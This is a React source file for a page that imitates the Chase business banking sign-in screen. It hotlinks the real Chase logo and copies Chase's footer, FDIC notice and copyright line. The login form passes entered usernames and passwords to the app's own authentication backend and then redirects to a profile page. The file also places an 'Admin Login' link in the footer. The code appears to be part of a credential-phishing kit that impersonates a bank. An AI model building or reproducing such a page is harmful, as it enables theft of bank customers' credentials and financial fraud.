import { useState } from "react";
import { ChevronRight, Eye, EyeOff } from "lucide-react";
import { FaFacebookF, FaInstagram, FaXTwitter, FaYoutube, FaLinkedinIn } from "react-icons/fa6";
import { useNavigate } from "react-router-dom";
import { useAuth } from "../../context/AuthContext";
import toast from "react-hot-toast";

const ChaseBusinessLoginPage = () => {
  const navigate = useNavigate();
  const { userLogin, loading } = useAuth();
  
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [useToken, setUseToken] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!userId || !password) {
      toast.error("Please enter both username and password.");
      return;
    }

    const result = await userLogin(userId, password);
    if (result.success) {
      navigate("/profile");
    }
  };

  return (
    <div className="min-h-screen flex flex-col font-sans text-[#333]">
      
      {/* ══════════ HERO & LOGIN AREA ══════════ */}
      <div 
        className="flex-1 relative flex flex-col items-center pt-8 pb-16 px-4"
        style={{
          backgroundImage: "linear-gradient(to bottom, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0) 20%), url('https://images.unsplash.com/photo-1496442226666-8d4d0e62e6e9?auto=format&fit=crop&w=1920&q=80')",
          backgroundSize: "cover",
          backgroundPosition: "center",
        }}
      >
        {/* Top Logo */}
        <div className="mb-12 cursor-pointer" onClick={() => navigate("/business")}>
          <img 
            src="https://www.chase.com/content/dam/unified-assets/logo/chase/chase-logo/additional-file-formats/logo_chase_headerfooter.svg" 
            alt="Chase Logo" 
            className="h-7 filter brightness-0 invert" 
          />
        </div>

        {/* Login Card */}
        <div className="bg-white w-full max-w-[400px] rounded p-8 shadow-xl">
          <form onSubmit={handleSubmit} className="flex flex-col gap-6">
            
            {/* Username */}
            <div className="relative border-b border-[#0060f0] pt-2 pb-1">
              <input
                type="text"
                placeholder="Username"
                value={userId}
                onChange={(e) => setUserId(e.target.value)}
                className="w-full text-[16px] outline-none bg-transparent"
                required
              />
            </div>

            {/* Password */}
            <div className="relative border-b border-[#0060f0] pt-2 pb-1 flex items-center justify-between">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full text-[16px] outline-none bg-transparent"
                required
              />
              <button 
                type="button" 
                onClick={() => setShowPassword(!showPassword)}
                className="text-[#0060f0] text-[14px] font-semibold hover:underline bg-white px-1 ml-2 flex-shrink-0 cursor-pointer"
              >
                {showPassword ? "Hide" : "Show"}
              </button>
            </div>

            {/* Checkboxes */}
            <div className="flex items-center justify-between mt-2">
              <label className="flex items-center gap-2 cursor-pointer">
                <input 
                  type="checkbox" 
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  className="w-4 h-4 rounded-sm border-gray-400 accent-[#0060f0]" 
                />
                <span className="text-[13px] text-[#555]">Remember username</span>
              </label>
              
              <label className="flex items-center gap-2 cursor-pointer">
                <input 
                  type="checkbox" 
                  checked={useToken}
                  onChange={(e) => setUseToken(e.target.checked)}
                  className="w-4 h-4 rounded-sm border-gray-400 accent-[#0060f0]" 
                />
                <span className="text-[13px] text-[#555]">Use token</span>
              </label>
            </div>

            {/* Primary Sign In Button */}
            <button 
              type="submit"
              disabled={loading}
              className="w-full bg-[#0060f0] hover:bg-[#004dcf] text-white py-3 rounded text-[16px] font-medium mt-2 transition-colors cursor-pointer disabled:bg-[#ccc]"
            >
              {loading ? "Signing in..." : "Sign in"}
            </button>

            {/* Divider */}
            <div className="relative flex items-center justify-center my-2">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-[#0060f0]"></div>
              </div>
              <div className="relative bg-white px-4 text-[12px] text-[#0060f0]">Or</div>
            </div>

            {/* Passwordless Sign In Button */}
            <button 
              type="button"
              className="w-full bg-white border border-[#0060f0] hover:bg-slate-50 text-[#0060f0] py-3 rounded text-[16px] font-medium transition-colors cursor-pointer"
            >
              Passwordless sign in
            </button>

            {/* Links */}
            <div className="flex flex-col gap-3 mt-4">
              <a href="#" className="flex items-center gap-1 text-[#0060f0] text-[13px] hover:underline">
                Forgot username/password? <ChevronRight size={14} />
              </a>
              <a href="#" className="flex items-center gap-1 text-[#0060f0] text-[13px] hover:underline">
                Not enrolled? Sign up now. <ChevronRight size={14} />
              </a>
            </div>

          </form>
        </div>
      </div>

      {/* ══════════ FOOTER ══════════ */}
      <footer className="bg-[#f4f4f4] text-[#555] py-10 px-6 text-[12px] border-t-4 border-[#0a3778]">
        <div className="max-w-[1200px] mx-auto flex flex-col items-center">
          
          {/* Social Icons */}
          <div className="flex items-center gap-5 mb-8 text-[#555]">
            <a href="#" className="hover:text-[#0060f0] transition-colors"><FaFacebookF size={18} /></a>
            <a href="#" className="hover:text-[#0060f0] transition-colors"><FaInstagram size={18} /></a>
            <a href="#" className="hover:text-[#0060f0] transition-colors"><FaXTwitter size={18} /></a>
            <a href="#" className="hover:text-[#0060f0] transition-colors"><FaYoutube size={18} /></a>
            <a href="#" className="hover:text-[#0060f0] transition-colors"><FaLinkedinIn size={18} /></a>
          </div>

          {/* Links Row 1 */}
          <div className="flex flex-wrap justify-center gap-x-6 gap-y-3 mb-4">
            <a href="#" className="hover:underline">Contact us</a>
            <a href="#" className="hover:underline">Privacy & security</a>
            <a href="#" className="hover:underline">Terms of use</a>
            <a href="#" className="hover:underline">Accessibility</a>
            <a href="#" className="hover:underline">SAFE Act: Chase Mortgage Loan Originators</a>
            <a href="#" className="hover:underline">Fair Lending</a>
            <a href="#" className="hover:underline">About Chase</a>
            <a href="#" className="hover:underline">J.P. Morgan</a>
            <a href="#" className="hover:underline">JPMorgan Chase & Co.</a>
            <a href="#" className="hover:underline">Careers</a>
            <a href="#" className="hover:underline">Español</a>
            <a href="#" className="hover:underline">Chase Canada</a>
          </div>

          {/* Links Row 2 */}
          <div className="flex flex-wrap justify-center items-center gap-x-6 gap-y-3 mb-6">
            <a onClick={() => navigate("/admin-login")} className="hover:underline cursor-pointer">Admin Login</a>
            <a href="#" className="hover:underline">Site map</a>
            <a href="#" className="hover:underline">Member FDIC</a>
            <span className="flex items-center gap-1"><span className="text-[14px]">⌂</span> Equal Housing Opportunity</span>
          </div>

          {/* Copyright */}
          <div className="text-[#888] text-[11px]">
            © {new Date().getFullYear()} JPMorgan Chase & Co.
          </div>

        </div>
      </footer>
      
    </div>
  );
};

export default ChaseBusinessLoginPage;
